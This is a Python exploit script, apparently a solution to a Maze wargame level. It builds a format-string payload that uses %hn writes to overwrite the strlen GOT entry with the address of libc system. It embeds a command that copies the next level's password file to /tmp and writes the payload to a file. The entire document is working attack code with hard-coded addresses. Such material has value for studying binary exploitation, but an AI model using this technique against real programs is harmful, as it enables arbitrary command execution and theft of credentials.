import socket, struct, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 31337
GOT_STRLEN = 0x0804b288
LIBC = 0xf7d6d000
SYSTEM = LIBC + 0x53ce0      # 0xf7dc0ce0

low  = SYSTEM & 0xffff          # 0x0ce0
high = (SYSTEM >> 16) & 0xffff  # 0xf7dc

# format text: command first (printed literally), then the %c padding + %hn
cmd = b"\ncat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\n"
# pointer slots: choose slot indices k1,k2 with byte offsets o = (k-1)*4 that
# fall AFTER the text (+ NUL + padding). We'll compute the text first, then
# place pointers at the next aligned slots.
# We need: total chars printed before %k1$hn = low; before %k2$hn = high.
# Layout: [cmd][fmt1][NUL][pad][ptr_G][ptr_G2]
# fmt1 = "%{low - len(cmd)}c%{k1}$hn%{high-low}c%{k2}$hn"
# but the k values depend on the offsets which depend on the fmt length...
# iterate to a fixed point.
def build(k1, k2, extra):
    fmt = (cmd +
           b"%" + str(low - len(cmd)).encode() + b"c%" +
           str(k1).encode() + b"$hn" +
           b"%" + str(high - low).encode() + b"c%" +
           str(k2).encode() + b"$hn")
    buf = fmt + b"\x00"
    # pad to the aligned slot offsets: slot k1 at byte (k1-1)*4
    o1 = (k1 - 1) * 4
    o2 = (k2 - 1) * 4
    while len(buf) < o1: buf += b"\x00"
    buf += struct.pack("<I", GOT_STRLEN)
    while len(buf) < o2: buf += b"\x00"
    buf += struct.pack("<I", GOT_STRLEN + 2)
    return buf

# fmt length ~ len(cmd)+~35 = ~70; slots at 76, 80 -> k1=20, k2=21 (o1=76,o2=80)
# must have o1 > len(fmt)+1. Iterate k from a safe base:
for base in range(18, 60):
    k1, k2 = base, base + 1
    buf = build(k1, k2, 0)
    # verify the fmt length fits before o1
    fmtlen = buf.index(b"\x00")
    if (k1 - 1) * 4 > fmtlen + 1 and (k2 - 1) * 4 == (k1 - 1) * 4 + 4:
        # the total must be <= 511 (recv cap)
        if len(buf) <= 511:
            print("slots", k1, k2, "fmtlen", fmtlen, "buflen", len(buf))
            open("/tmp/m8payload.bin", "wb").write(buf)
            break
else:
    sys.exit("no slots found")
